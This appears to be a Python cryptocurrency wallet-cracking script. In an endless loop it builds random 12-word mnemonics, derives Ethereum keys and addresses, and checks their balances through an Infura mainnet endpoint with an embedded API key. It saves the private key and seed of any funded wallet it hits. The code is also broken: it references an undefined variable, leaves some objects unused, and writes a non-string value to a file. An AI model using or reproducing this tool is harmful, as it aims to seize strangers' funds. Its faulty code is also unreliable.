from datasets import load_dataset
from web3 import Web3
from eth_account import Account
from bip44 import Wallet
import random
from time import sleep

ds = load_dataset("georgecane/random_words")

wor = ["apple", "bicycle", "candle", "dragon", "elephant", "flower", "guitar", "honey", "island", 
         "jungle", "kite", "lemon", "mountain", "notebook", "ocean", "puzzle", "quartz", "rainbow", 
         "sunflower", "tiger", "umbrella", "village", "waterfall", "yacht", "zebra"]
print ("Starting..... \n\n")
def words_open():
    global wrd
    with open ("words.txt", 'r')as words:
        wordd = words.readlines()
        wrd = [word.strip() for word in wordd]
        
      
   
def get_words(words):
    global privte_key
    global wallet_address
    global mem_word
    words_open()
    words12 = random.sample(wrd, 12)
    mem_word = ' '.join(words12)    
    words16 = random.sample(words, 16)
    wallet = Wallet(mem_word)
    eth_account_key = wallet.derive_account('eth')    
    # generate wallet
    account_privte_key, account_public = eth_account_key
    privte_key = account_privte_key.hex()    
    account = Account.from_key(privte_key)
    wallet_address = account.address
    
    
    
def connector():
    get_words(words)    
    infura_url = "https://mainnet.infura.io/v3/b799ceb851044d8cb87e03e39c941b80"
    web3 = Web3(Web3.HTTPProvider(infura_url))
# Check if the connection is successful
    if web3.is_connected():
        global balance_in_ether
        balance = web3.eth.get_balance(wallet_address)
    
    # Convert the balance from Wei to Ether
        balance_in_ether = web3.from_wei(balance, 'ether')
        
        print(f"Address: {wallet_address}")
       
        
        
    else:
        print("Failed to connect to the Ethereum network")

def checker():
    try:
        connector()
        
        if balance_in_ether != 0:
            with open('success.txt', 'w')as suc:
                suc.write(privte_key)
                suc.write(mem_word)
                suc.write(wallet_address)
                suc.write(balance_in_ether)
                suc.close()
            print (f"SUCCESS!!!! \n {wallet_address} \n{privte_key} \n {balance_in_ether}")    
        else:
            pass
    except Exception as e:
        print(f"ERROR! {e}")
            

while True:
    checker()
    sleep(2)
       
        
        